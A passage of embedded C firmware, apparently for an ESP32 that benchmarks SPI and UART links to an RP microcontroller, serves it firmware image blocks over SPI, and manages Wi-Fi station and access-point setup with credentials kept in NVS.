    return slot->kind == SPI_BENCH_KIND_UART ? slot->peer_tx : slot->frames;
}

static bool bench_step_passed(const bench_step_t *slot)
{
    if (!slot->valid || slot->frames == 0)
    {
        return false;
    }

    if (slot->kind == SPI_BENCH_KIND_UART && slot->peer_tx == 0)
    {
        return false;
    }

    if (slot->miso_bad != 0 || slot->mosi_bad != 0 || slot->xfer_fail != 0)
    {
        return false;
    }

    if (slot->offset_max >= SPI_MAGIC_SEARCH_MAX)
    {
        return false;
    }

    uint32_t miso_sent = bench_miso_sent(slot);

    if (slot->kind == SPI_BENCH_KIND_UART)
    {
        // Same asynchronous edge slack the RP applies (see uart_rp_clean): a clean
        // UART link may lose a frame or two at the window edges without being corrupt.
        // Corruption and resyncs are already rejected above, so this only forgives the
        // start/stop misalignment, keeping the ESP's verdict consistent with the RP's.
        uint32_t mosi_lost = slot->frames > slot->mosi_ok ? slot->frames - slot->mosi_ok : 0;
        uint32_t miso_lost = miso_sent > slot->miso_ok ? miso_sent - slot->miso_ok : 0;
        uint32_t mosi_slack = slot->frames / 1000u;
        uint32_t miso_slack = miso_sent / 1000u;

        if (mosi_slack < UART_BENCH_EDGE_SLACK)
        {
            mosi_slack = UART_BENCH_EDGE_SLACK;
        }

        if (miso_slack < UART_BENCH_EDGE_SLACK)
        {
            miso_slack = UART_BENCH_EDGE_SLACK;
        }

        return mosi_lost <= mosi_slack && miso_lost <= miso_slack;
    }

    if (slot->soaked)
    {
        return slot->miso_ok == miso_sent && slot->mosi_ok >= slot->frames;
    }

    return (uint64_t)slot->miso_ok * 1000ull >= (uint64_t)miso_sent * SPI_BENCH_MIN_PASS_PERMIL &&
           (uint64_t)slot->mosi_ok * 1000ull >= (uint64_t)slot->frames * SPI_BENCH_MIN_PASS_PERMIL;
}

static uint8_t bench_mosi_verdict(uint8_t step)
{
    if (step >= SPI_BENCH_MAX_STEPS)
    {
        return 0;
    }

    const bench_step_t *slot = &spi_bench_steps[step];

    if (slot->mosi_bad != 0 || slot->frames == 0)
    {
        return 0;
    }

    if (slot->kind == SPI_BENCH_KIND_UART)
    {
        // A UART step is asynchronous, so a frame or two lost at the edges of the
        // window is an artifact of when each side starts and stops, not corruption
        // (corruption is caught by mosi_bad above). Allow the same small absolute
        // edge slack the RP uses so a clean link is judged clean on both sides.
        uint32_t lost = slot->frames > slot->mosi_ok ? slot->frames - slot->mosi_ok : 0;
        uint32_t slack = slot->frames / 1000u;

        if (slack < UART_BENCH_EDGE_SLACK)
        {
            slack = UART_BENCH_EDGE_SLACK;
        }

        return lost <= slack ? 1 : 0;
    }

    if (slot->soaked)
    {
        return slot->mosi_ok >= slot->frames ? 1 : 0;
    }

    return (uint64_t)slot->mosi_ok * 1000ull >= (uint64_t)slot->frames * SPI_BENCH_MIN_PASS_PERMIL ? 1 : 0;
}

static bool rp_image_load_window(uint32_t offset)
{
    if (rp_image_fd < 0)
    {
        return false;
    }

    if (lseek(rp_image_fd, (off_t)offset, SEEK_SET) != (off_t)offset)
    {
        return false;
    }

    int got = read(rp_image_fd, rp_window, RP_WINDOW_SIZE);
    if (got <= 0)
    {
        return false;
    }

    if ((size_t)got < RP_WINDOW_SIZE)
    {
        memset(rp_window + got, 0, RP_WINDOW_SIZE - (size_t)got);
    }

    rp_window_offset = offset;

    return true;
}

static void spi_fill_frame(uint8_t *frame, int index)
{
    if (SPI_TX_DIAGNOSTIC_FILL == 1)
    {
        memset(frame, 0xFF, SPI_FRAME_SIZE);
        return;
    }

    if (SPI_TX_DIAGNOSTIC_FILL == 2)
    {
        for (size_t i = 0; i < SPI_FRAME_SIZE; ++i)
        {
            frame[i] = (uint8_t)(0xA0 + i);
        }

        return;
    }

    uint8_t *head = frame + SPI_FRAME_LEAD;

    if (spi_bench_state == BENCH_RUNNING && spi_bench_kind == SPI_BENCH_KIND_UART)
    {
        memset(frame, 0, SPI_FRAME_SIZE);
        memcpy(head, spi_frame_magic, sizeof(spi_frame_magic));

        head[4] = SPI_FRAME_VERSION;
        head[5] = SPI_FRAME_TYPE_UART_STATS;
        head[6] = (uint8_t)FIRMV;
        head[7] = SPI_FLAG_BENCH_ARMED;

        head[SPI_BENCH_MISO_ACK_OFF] = spi_bench_ack_step;
        head[SPI_BENCH_MISO_RUN_OFF] = spi_bench_run_id;
        head[SPI_BENCH_MISO_VERDICT_OFF] = bench_mosi_verdict(spi_bench_ack_step);
        head[SPI_BENCH_MISO_RACK_OFF] = spi_bench_result_ack;

        head[SPI_UART_STATS_TOKEN_OFF] = uart_bench_acked;
        head[SPI_UART_STATS_READY_OFF] = uart_bench_ready ? 1 : 0;

        spi_put_u32(head + SPI_UART_STATS_RX_OK_OFF, uart_bench_rx_ok);
        spi_put_u32(head + SPI_UART_STATS_RX_BAD_OFF, uart_bench_rx_bad);
        spi_put_u32(head + SPI_UART_STATS_RESYNC_OFF, uart_bench_resync);
        spi_put_u32(head + SPI_UART_STATS_TX_OFF, uart_bench_tx);
        spi_put_u32(head + SPI_UART_STATS_BAUD_OFF, uart_bench_baud);

        return;
    }

    if (spi_bench_state == BENCH_RUNNING)
    {
        bool seeded = index >= 0 && index < SPI_QUEUE_DEPTH && spi_bench_tx_epoch[index] == spi_bench_epoch;

        if (!seeded)
        {
            memset(frame, 0, SPI_FRAME_SIZE);
            memcpy(head, spi_frame_magic, sizeof(spi_frame_magic));

            head[4] = SPI_FRAME_VERSION;
            head[6] = (uint8_t)FIRMV;

            spi_bench_fill_pattern(head + SPI_BENCH_MISO_PATTERN_OFF, SPI_BENCH_MISO_PATTERN_LEN,
                                   spi_bench_epoch * SPI_QUEUE_DEPTH + (uint32_t)(index < 0 ? 0 : index));

            uint32_t state =
                crc32_update(0xffffffffu, head + SPI_BENCH_MISO_CRC_A_OFF, SPI_BENCH_MISO_CRC_A_LEN);

            if (index >= 0 && index < SPI_QUEUE_DEPTH)
            {
                spi_bench_tx_state[index] = state;
                spi_bench_tx_epoch[index] = spi_bench_epoch;
            }
        }

        head[5] = SPI_FRAME_TYPE_BENCH;
        head[7] = SPI_FLAG_BENCH_ARMED;

        spi_bench_seq++;

        spi_put_u32(head + SPI_BENCH_MISO_SEQ_OFF, spi_bench_seq);
        head[SPI_BENCH_MISO_ACK_OFF] = spi_bench_ack_step;
        head[SPI_BENCH_MISO_RUN_OFF] = spi_bench_run_id;
        head[SPI_BENCH_MISO_VERDICT_OFF] = bench_mosi_verdict(spi_bench_ack_step);
        head[SPI_BENCH_MISO_RACK_OFF] = spi_bench_result_ack;

        uint32_t state = index >= 0 && index < SPI_QUEUE_DEPTH
                             ? spi_bench_tx_state[index]
                             : crc32_update(0xffffffffu, head + SPI_BENCH_MISO_CRC_A_OFF,
                                            SPI_BENCH_MISO_CRC_A_LEN);

        spi_put_u32(head + SPI_BENCH_MISO_CRC_OFF,
                    crc32_update(state, head + SPI_BENCH_MISO_CRC_B_OFF, SPI_BENCH_MISO_CRC_B_LEN) ^ 0xffffffffu);

        return;
    }

    memset(frame, 0, SPI_FRAME_SIZE);

    memcpy(head, spi_frame_magic, sizeof(spi_frame_magic));

    head[4] = SPI_FRAME_VERSION;
    head[5] = SPI_FRAME_TYPE_STATUS;
    head[6] = (uint8_t)FIRMV;

    uint8_t flags = 0;

    if (st_state == ST_RUNNING)
    {
        flags |= SPI_FLAG_SELFTEST_ARMED;

        head[SPI_SELFTEST_STATUS_RUN_OFF] = st_run_id;
        head[SPI_SELFTEST_STATUS_OPTS_OFF] = st_opts;
    }

    head[SPI_SELFTEST_STATUS_BLINK_OFF] = st_blink;

    head[SPI_SELFTEST_STATUS_EBOOT_OFF] = (uint8_t)gpio_get_level(EBOOT_MASTERDATAREADY_GPIO);

    head[SPI_WIFI_MODE_OFF] = wifi_link;
    spi_put_u32(head + SPI_WIFI_IP_OFF, wifi_ip);
    spi_put_u32(head + SPI_UART_MIN_BAUD_OFF, spi_bench_min_baud);
    spi_put_u32(head + SPI_UART_MAX_BAUD_OFF, spi_bench_max_baud);

    head[SPI_BENCH_STATUS_STATE_OFF] = spi_bench_state;
    head[SPI_BENCH_STATUS_ACK_OFF] = spi_bench_ack_step;
    head[SPI_BENCH_STATUS_VERDICT_OFF] = bench_mosi_verdict(spi_bench_ack_step);
    head[SPI_BENCH_STATUS_RACK_OFF] = spi_bench_result_ack;

    if (spi_bench_state == BENCH_ARMED)
    {
        flags |= SPI_FLAG_BENCH_ARMED;

        spi_put_u32(head + 8, spi_bench_ms);

        head[SPI_BENCH_STATUS_RUN_OFF] = spi_bench_run_id;
        head[SPI_BENCH_STATUS_STEPS_OFF] = spi_bench_max_steps;
        head[SPI_BENCH_STATUS_MINKHZ_OFF] = (uint8_t)spi_bench_min_khz;
        head[SPI_BENCH_STATUS_MINKHZ_OFF + 1] = (uint8_t)(spi_bench_min_khz >> 8);
        head[SPI_BENCH_STATUS_MAXKHZ_OFF] = (uint8_t)spi_bench_max_khz;
        head[SPI_BENCH_STATUS_MAXKHZ_OFF + 1] = (uint8_t)(spi_bench_max_khz >> 8);

        spi_put_u32(head + SPI_BENCH_STATUS_SOAKMS_OFF, spi_bench_soak_ms);

        head[SPI_BENCH_STATUS_DOWN_OFF] = spi_bench_stepdowns;
        head[SPI_BENCH_STATUS_OC_OFF] = spi_bench_overclock;
        head[SPI_BENCH_STATUS_KIND_OFF] = spi_bench_kind;

        head[SPI_BENCH_STATUS_RESUME_OFF] = (uint8_t)rbench_resume_khz;
        head[SPI_BENCH_STATUS_RESUME_OFF + 1] = (uint8_t)(rbench_resume_khz >> 8);
    }

    if (rp_image_ready && !ota_reboot_pending)
    {
        flags |= SPI_FLAG_RP_IMAGE_READY;
        spi_put_u32(head + 12, rp_image_size);
        spi_put_u32(head + 16, rp_image_crc);
    }

    if (rp_commit_frames_left > 0)
    {
        rp_commit_frames_left--;
        flags |= SPI_FLAG_RP_COMMIT;
    }

    if (rp_commit_pending && !app_awaiting_validation && !ota_reboot_pending)
    {
        flags |= SPI_FLAG_RP_COMMIT;
    }

    if (esp_rp_reset_pending)
    {
        flags |= SPI_FLAG_RP_RESET;
    }

    head[7] = flags;
    spi_put_u32(head + 20, SPI_NO_BLOCK);

    uint32_t block = spi_requested_block;
    uint32_t size = rp_image_size;

    if (!rp_image_ready || block == SPI_NO_BLOCK || block > (RP_IMAGE_MAX_SIZE / SPI_BLOCK_PAYLOAD))
    {
        return;
    }

    uint32_t offset = block * SPI_BLOCK_PAYLOAD;

    if (size == 0 || offset >= size)
    {
        return;
    }

    uint32_t window = offset & ~(uint32_t)(RP_WINDOW_SIZE - 1);

    rp_image_in_use = true;

    if (window != rp_window_offset && !rp_image_load_window(window))
    {
        rp_image_in_use = false;
        return;
    }

    if (!rp_image_ready || rp_image_size != size)
    {
        rp_image_in_use = false;
        return;
    }

    uint32_t remaining = size - offset;
    uint16_t len = (uint16_t)(remaining < SPI_BLOCK_PAYLOAD ? remaining : SPI_BLOCK_PAYLOAD);

    head[5] = SPI_FRAME_TYPE_DATA;
    spi_put_u32(head + 20, block);
    head[24] = (uint8_t)len;
    head[25] = (uint8_t)(len >> 8);

    memcpy(frame + SPI_PAYLOAD_OFFSET, rp_window + (offset - window), len);

    rp_image_in_use = false;

    spi_blocks_served++;
}

static void spi_handle_control_frame(const uint8_t *frame)
{
    stats.spi_polls++;

    if (spi_bench_state == BENCH_RUNNING)
    {
        if (spi_bench_kind == SPI_BENCH_KIND_UART)
        {
            // The UART benchmark polls over SPI to read the peer's stats while the
            // measured traffic flows over the UART, so a POLL here is expected and
            // must KEEP the run alive. Only a SPI bench treats a POLL as the RP
            // returning to normal operation and aborts.
            bench_saw_rp_frame();
        }
        else
        {
            spi_bench_state = BENCH_ABORTED;
        }
    }

    rp_frame_version = frame[4];
    rp_last_seen_ms = (uint32_t)(esp_timer_get_time() / 1000);

    if (memcmp(rp_identity, frame + SPI_IDENTITY_OFFSET, SPI_IDENTITY_MAX - 1) != 0)
    {
        memcpy(rp_identity, frame + SPI_IDENTITY_OFFSET, SPI_IDENTITY_MAX - 1);
        rp_identity[SPI_IDENTITY_MAX - 1] = '\0';

        for (size_t i = 0; i < SPI_IDENTITY_MAX - 1; ++i)
        {
            if (rp_identity[i] != '\0' && (rp_identity[i] < 0x20 || rp_identity[i] > 0x7E))
            {
                rp_identity[i] = '?';
            }
        }
    }

    if (frame[4] != SPI_FRAME_VERSION)
    {
        stats.spi_proto_mismatch++;
        return;
    }

    uint32_t reported_app_crc = spi_get_u32(frame + 12);

    if (rp_commit_pending && rp_image_ready && reported_app_crc != 0 && reported_app_crc == rp_image_crc)
    {
        rp_commit_completed = true;
    }

    if (frame[5] == SPI_CTRL_TYPE_REQUEST_BLOCK)
    {
        spi_requested_block = spi_get_u32(frame + 8);
    }
}

static size_t spi_payload_length(const uint8_t *data)
{
    size_t len = 0;

    while (len < SPI_FRAME_SIZE && data[len] != 0)
    {
        len++;
    }

    return len;
}

static void spi_task(void *arg)
{
    (void)arg;

    spi_bus_config_t buscfg = {
        .mosi_io_num = GPIO_MOSI,
        .miso_io_num = GPIO_MISO,
        .sclk_io_num = GPIO_SCLK,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
    };

    spi_slave_interface_config_t slvcfg = {
        .spics_io_num = GPIO_CS,
        .flags = 0,
        .queue_size = SPI_QUEUE_DEPTH,
        .mode = 0,
        .post_setup_cb = spi_post_setup_cb,
        .post_trans_cb = spi_post_trans_cb,
    };

    gpio_config_t slave_ready_conf = {
        .pin_bit_mask = BIT64(ELOG_SLAVEREADY_GPIO),
        .mode = GPIO_MODE_OUTPUT,
        .pull_up_en = GPIO_PULLUP_DISABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE,
    };

    gpio_config_t master_ready_conf = {
        .pin_bit_mask = BIT64(EBOOT_MASTERDATAREADY_GPIO),
        .mode = GPIO_MODE_INPUT,
        .pull_up_en = GPIO_PULLUP_ENABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE,
    };

    gpio_config(&slave_ready_conf);
    gpio_set_level(ELOG_SLAVEREADY_GPIO, 0);
    gpio_config(&master_ready_conf);

    gpio_set_pull_mode(GPIO_MOSI, GPIO_PULLUP_ONLY);
    gpio_set_pull_mode(GPIO_SCLK, GPIO_PULLUP_ONLY);
    gpio_set_pull_mode(GPIO_CS, GPIO_PULLUP_ONLY);

    ESP_ERROR_CHECK(spi_slave_initialize(RCV_HOST, &buscfg, &slvcfg, SPI_DMA_CH_AUTO));

    for (int i = 0; i < SPI_QUEUE_DEPTH; ++i)
    {
        memset(spi_rx_buffers[i], 0, SPI_FRAME_SIZE);
        spi_fill_frame(spi_tx_buffers[i], i);

        spi_transactions[i].flags = 0;
        spi_transactions[i].length = SPI_FRAME_SIZE * 8;
        spi_transactions[i].trans_len = 0;
        spi_transactions[i].tx_buffer = spi_tx_buffers[i];
        spi_transactions[i].rx_buffer = spi_rx_buffers[i];
        spi_transactions[i].user = (void *)(intptr_t)i;

        ESP_ERROR_CHECK(spi_slave_queue_trans(RCV_HOST, &spi_transactions[i], portMAX_DELAY));
    }

    ESP_LOGI(SPI_TAG, "slave armed with %d queued transactions", SPI_QUEUE_DEPTH);

    while (1)
    {
        spi_slave_transaction_t *done = NULL;

        esp_err_t err = spi_slave_get_trans_result(RCV_HOST, &done, portMAX_DELAY);
        if (err != ESP_OK || done == NULL)
        {
            stats.spi_errors++;
            vTaskDelay(1);
            continue;
        }

        stats.spi_transactions++;

        uint8_t *received = (uint8_t *)done->rx_buffer;

        bench_service();
        st_service();

        if (spi_is_control_frame(received))
        {
            if (received[5] == SPI_CTRL_TYPE_BENCH)
            {
                bench_account_mosi(received, (size_t)done->trans_len);
            }
            else if (received[5] == SPI_CTRL_TYPE_BENCH_RESULT)
            {
                bench_accept_result(received);
            }
            else if (received[5] == SPI_CTRL_TYPE_UART_SETUP)
            {
                bench_accept_uart_setup(received);
            }
            else if (received[5] == SPI_CTRL_TYPE_SELFTEST)
            {
                bench_accept_selftest(received);
            }
            else
            {
                spi_handle_control_frame(received);
            }
        }
        else if (spi_bench_state == BENCH_RUNNING && spi_bench_kind == SPI_BENCH_KIND_SPI)
        {
            if (!spi_frame_is_silent(received))
            {
                bench_account_garbage_frame(received, (size_t)done->trans_len);
                bench_account_garbage();
            }
        }
        else if (spi_bench_state == BENCH_RUNNING)
        {
            spi_bench_last_frame_ms = bench_now_ms();
        }
        else
        {
            size_t len = spi_payload_length(received);

            if (len > 0)
            {
                hid_ring_publish(received, len);
                stats.spi_records++;
                spi_last_record_bits = (uint32_t)done->trans_len;
            }
            else
            {
                stats.spi_empty++;
                spi_last_empty_bits = (uint32_t)done->trans_len;
                memcpy(spi_last_empty_head, received, sizeof(spi_last_empty_head));
            }
        }

        int index = (int)(intptr_t)done->user;

        memset(received, 0, SPI_FRAME_SIZE);

        if (index >= 0 && index < SPI_QUEUE_DEPTH)
        {
            spi_fill_frame(spi_tx_buffers[index], index);
        }

        done->trans_len = 0;

        if (spi_slave_queue_trans(RCV_HOST, done, portMAX_DELAY) != ESP_OK)
        {
            stats.spi_queue_errors++;
        }
    }
}

static void wifi_cfg_defaults(void)
{
#if defined(OKHI_DEV_STA_SSID) && defined(OKHI_DEV_STA_PASS)
    snprintf(wifi_ssid, sizeof(wifi_ssid), "%s", OKHI_DEV_STA_SSID);
    snprintf(wifi_pass, sizeof(wifi_pass), "%s", OKHI_DEV_STA_PASS);
    wifi_want_sta = true;
#else
    wifi_ssid[0] = '\0';
    wifi_pass[0] = '\0';
    wifi_want_sta = false;
#endif
}

static void wifi_build_stamp(char *out, size_t out_size)
{
    const esp_app_desc_t *desc = esp_app_get_description();

    int len = snprintf(out, out_size, "sha ");

    for (int i = 0; i < 8 && len > 0 && (size_t)len + 2 < out_size; ++i)
    {
        len += snprintf(out + len, out_size - (size_t)len, "%02x", desc->app_elf_sha256[i]);
    }
}

static void wifi_cfg_store_fail_count(uint8_t fails)
{
    nvs_handle_t handle;

    if (nvs_open(WIFI_CFG_NS, NVS_READWRITE, &handle) != ESP_OK)
    {
        return;
    }

    nvs_set_u8(handle, "stafail", fails);
    nvs_commit(handle);
    nvs_close(handle);
}

static bool wifi_cfg_save(const char *ssid, const char *pass, bool sta)
{
    nvs_handle_t handle;

    if (nvs_open(WIFI_CFG_NS, NVS_READWRITE, &handle) != ESP_OK)
    {
        return false;
    }

    bool ok = nvs_set_str(handle, "ssid", ssid) == ESP_OK && nvs_set_str(handle, "pass", pass) == ESP_OK &&
              nvs_set_u8(handle, "sta", sta ? 1 : 0) == ESP_OK && nvs_set_u8(handle, "stafail", 0) == ESP_OK &&
              nvs_commit(handle) == ESP_OK;

    nvs_close(handle);

    return ok;
}

static bool ota_nvs_get_rp_pending(uint32_t *size, uint32_t *crc);
static void ota_nvs_set_rp_pending(uint32_t size, uint32_t crc);

// Bump the persistent boot counter. Call AFTER wifi_cfg_load so it runs on the
// clean NVS a firmware change leaves behind, which is why the count resets to 1
// on a new build and only climbs across plain reboots.
static void reset_count_bump(void)
{
    nvs_handle_t handle;

    esp_reset_times = 0;

    if (nvs_open(WIFI_CFG_NS, NVS_READWRITE, &handle) != ESP_OK)
    {
        return;
    }

    uint32_t count = 0;

    nvs_get_u32(handle, "resets", &count);
    count++;

    nvs_set_u32(handle, "resets", count);
    nvs_commit(handle);
    nvs_close(handle);

    esp_reset_times = count;
}

static void wifi_cfg_load(void)
{
    char stamp[48];
    char stored[48];

    wifi_build_stamp(stamp, sizeof(stamp));
    wifi_cfg_defaults();

    nvs_handle_t handle;

    if (nvs_open(WIFI_CFG_NS, NVS_READWRITE, &handle) != ESP_OK)
    {
        return;
    }

    size_t len = sizeof(stored);

    stored[0] = '\0';

    bool same = nvs_get_str(handle, "build", stored, &len) == ESP_OK && strcmp(stored, stamp) == 0;

    nvs_close(handle);

    if (!same)
    {
        ESP_LOGW(WIFI_TAG, "new build (%s), erasing everything that was stored", stamp);

        uint32_t rp_size = 0;
        uint32_t rp_crc = 0;
        bool rp_pending = ota_nvs_get_rp_pending(&rp_size, &rp_crc);

        nvs_flash_erase();
        nvs_flash_init();

        if (rp_pending)
        {
            ESP_LOGW(WIFI_TAG, "carrying the pending RP image across the wipe: %u bytes crc %08x",
                     (unsigned)rp_size, (unsigned)rp_crc);
            ota_nvs_set_rp_pending(rp_size, rp_crc);
        }

        if (nvs_open(WIFI_CFG_NS, NVS_READWRITE, &handle) == ESP_OK)
        {
            nvs_set_str(handle, "build", stamp);
            nvs_commit(handle);
            nvs_close(handle);
        }

        return;
    }

    if (nvs_open(WIFI_CFG_NS, NVS_READONLY, &handle) != ESP_OK)
    {
        return;
    }

    char ssid[WIFI_SSID_MAX];
    char pass[WIFI_PASS_MAX];
    uint8_t sta = 0;
    uint8_t fails = 0;

    len = sizeof(ssid);

    if (nvs_get_str(handle, "ssid", ssid, &len) == ESP_OK && ssid[0] != '\0')
    {
        len = sizeof(pass);

        if (nvs_get_str(handle, "pass", pass, &len) == ESP_OK && nvs_get_u8(handle, "sta", &sta) == ESP_OK)
        {
            snprintf(wifi_ssid, sizeof(wifi_ssid), "%s", ssid);
            snprintf(wifi_pass, sizeof(wifi_pass), "%s", pass);
            wifi_want_sta = sta != 0;
        }
    }

    if (nvs_get_u8(handle, "stafail", &fails) == ESP_OK && fails >= WIFI_STA_MAX_FAILS)
    {
        wifi_forced_ap = true;
    }

    nvs_close(handle);
}

static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data)
{
    (void)arg;

    if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP)
    {
        ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;

        wifi_ip = event->ip_info.ip.addr;
        wifi_link = WIFI_LINK_STA;

        wifi_cfg_store_fail_count(0);

        ESP_LOGI(WIFI_TAG, "joined %s, address " IPSTR, wifi_ssid, IP2STR(&event->ip_info.ip));

        return;
    }

    if (event_base != WIFI_EVENT)
    {
        return;
    }

    if (event_id == WIFI_EVENT_STA_START || event_id == WIFI_EVENT_STA_DISCONNECTED)
    {
        if (event_id == WIFI_EVENT_STA_DISCONNECTED)
        {
            wifi_ip = 0;
            wifi_link = WIFI_LINK_CONNECTING;
        }

        esp_wifi_connect();

        return;
    }

    if (event_id == WIFI_EVENT_AP_STACONNECTED)
    {
        wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
        ESP_LOGI(WIFI_TAG, "station " MACSTR " join, AID=%d", MAC2STR(event->mac), event->aid);
    }
    else if (event_id == WIFI_EVENT_AP_STADISCONNECTED)
    {
        wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
        ESP_LOGI(WIFI_TAG, "station " MACSTR " leave, AID=%d, reason=%d", MAC2STR(event->mac), event->aid,
                 event->reason);
    }
}

static void wifi_service(void)
{
    if (wifi_reboot_at_ms != 0 && bench_now_ms() >= wifi_reboot_at_ms)
    {
        esp_restart();
    }

    if (wifi_link != WIFI_LINK_CONNECTING || wifi_sta_deadline_ms == 0)
    {
        return;
    }

    if (bench_now_ms() < wifi_sta_deadline_ms)
    {
        return;
    }

    wifi_sta_deadline_ms = 0;

    nvs_handle_t handle;
    uint8_t fails = 0;

    if (nvs_open(WIFI_CFG_NS, NVS_READWRITE, &handle) == ESP_OK)
    {
        nvs_get_u8(handle, "stafail", &fails);
        nvs_set_u8(handle, "stafail", (uint8_t)(fails + 1));
        nvs_commit(handle);
        nvs_close(handle);
    }

    ESP_LOGE(WIFI_TAG, "could not join %s, attempt %u, rebooting", wifi_ssid, (unsigned)(fails + 1));

    esp_restart();
}

static void wifi_start(void)
{
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    bool sta = wifi_want_sta && !wifi_forced_ap && wifi_ssid[0] != '\0';

    wifi_netif = sta ? esp_netif_create_default_wifi_sta() : esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL));
    ESP_ERROR_CHECK(
        esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &wifi_event_handler, NULL, NULL));

    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    if (sta)
    {
        wifi_config_t sta_config = {0};

        strncpy((char *)sta_config.sta.ssid, wifi_ssid, sizeof(sta_config.sta.ssid));
        strncpy((char *)sta_config.sta.password, wifi_pass, sizeof(sta_config.sta.password));

        sta_config.sta.threshold.authmode = wifi_pass[0] == '\0' ? WIFI_AUTH_OPEN : WIFI_AUTH_WPA_PSK;
        sta_config.sta.pmf_cfg.capable = true;

        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &sta_config));
        ESP_ERROR_CHECK(esp_wifi_start());
        ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

        wifi_link = WIFI_LINK_CONNECTING;
        wifi_sta_deadline_ms = bench_now_ms() + WIFI_STA_GIVE_UP_MS;

        ESP_LOGI(WIFI_TAG, "joining %s as a client", wifi_ssid);

        return;
    }

    wifi_config_t wifi_config = {
        .ap =
            {
                .channel = ESP_WIFI_CHANNEL,
                .password = ESP_WIFI_PASS,
                .max_connection = MAX_STA_CONN,
                .authmode = WIFI_AUTH_WPA2_PSK,
                .pmf_cfg =
                    {
                        .capable = true,
                        .required = false,
                    },
                .gtk_rekey_interval = GTK_REKEY_INTERVAL,
            },
    };

    if (strlen(ESP_WIFI_PASS) == 0)
    {
        wifi_config.ap.authmode = WIFI_AUTH_OPEN;
    }

    uint8_t mac[6] = {0};
    ESP_ERROR_CHECK(esp_read_mac(mac, ESP_MAC_WIFI_SOFTAP));

    char ssid[32] = {0};
    int n = snprintf(ssid, sizeof(ssid), "%s_%02X%02X%02X%02X%02X%02X", WIFI_PREFIX, mac[0], mac[1], mac[2], mac[3],
                     mac[4], mac[5]);

    memcpy(wifi_config.ap.ssid, ssid, n);
    wifi_config.ap.ssid_len = n;

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    esp_netif_ip_info_t info;

    if (wifi_netif != NULL && esp_netif_get_ip_info(wifi_netif, &info) == ESP_OK)
    {
        wifi_ip = info.ip.addr;
    }

    wifi_link = WIFI_LINK_AP;

    snprintf(wifi_ap_ssid, sizeof(wifi_ap_ssid), "%s", ssid);

    ESP_LOGI(WIFI_TAG, "access point %s, password %s, channel %d, address " IPSTR, ssid, ESP_WIFI_PASS,
             ESP_WIFI_CHANNEL, IP2STR(&info.ip));
}

static void uart_init(void)
{
    uart_config_t cfg = {
        .baud_rate = RP_UART_BAUD,
        .data_bits = UART_DATA_8_BITS,
        .parity = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };

    ESP_ERROR_CHECK(uart_param_config(UART_PORT, &cfg));
    ESP_ERROR_CHECK(uart_set_pin(UART_PORT, UART_TX_PIN, UART_RX_PIN, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE));
    ESP_ERROR_CHECK(uart_driver_install(UART_PORT, UART_RXBUF_SZ, 0, 0, NULL, 0));
}

static void rp_status_snapshot(char *out, size_t out_size)
{
    uint8_t index = __atomic_load_n(&rp_status_index, __ATOMIC_ACQUIRE);

    snprintf(out, out_size, "%s", rp_status[index & 1]);
}

static void rp_status_publish(const uint8_t *chunk, size_t len)
{
    uint8_t next = (uint8_t)((rp_status_index & 1) ^ 1);
    char *target = rp_status[next];

    size_t used = 0;
    for (size_t i = 0; i < len && used + 1 < RP_STATUS_MAX; ++i)
    {
        if (chunk[i] == 0)
        {
            continue;
        }

        target[used++] = (chunk[i] >= 0x20 && chunk[i] <= 0x7E) ? (char)chunk[i] : '?';
    }

    target[used] = '\0';

    __atomic_store_n(&rp_status_index, next, __ATOMIC_RELEASE);
}

static uint8_t uart_bench_rx_frame[UART_BENCH_FRAME_LEN];
static uint8_t uart_bench_tx_frame[UART_BENCH_FRAME_LEN];
static uint8_t uart_bench_expect[UART_BENCH_PAYLOAD];

static const uint8_t uart_bench_magic[4] = {UART_BENCH_MAGIC0, UART_BENCH_MAGIC1, UART_BENCH_MAGIC2,
                                            UART_BENCH_MAGIC3};

static void uart_bench_build(uint8_t *frame, uint32_t seed, uint32_t seq)
{
    memcpy(frame, uart_bench_magic, sizeof(uart_bench_magic));
    spi_put_u32(frame + UART_BENCH_SEQ_OFF, seq);
    spi_bench_fill_pattern(frame + UART_BENCH_DATA_OFF, UART_BENCH_PAYLOAD, seed + seq);
    spi_put_u32(frame + UART_BENCH_CRC_OFF, crc32_buffer(frame + UART_BENCH_CRC_FROM, UART_BENCH_CRC_LEN));
}

static void uart_bench_reset_counters(void)
{
    uart_bench_rx_ok = 0;
    uart_bench_rx_bad = 0;
    uart_bench_resync = 0;
    uart_bench_tx = 0;
}

static void uart_bench_feed(uint8_t byte, uint8_t *fill, uint32_t seed, uint32_t *last_seq)
{
    if (*fill < sizeof(uart_bench_magic))
    {
        if (byte == uart_bench_magic[*fill])
        {
            uart_bench_rx_frame[(*fill)++] = byte;
            return;
        }

        uart_bench_resync++;

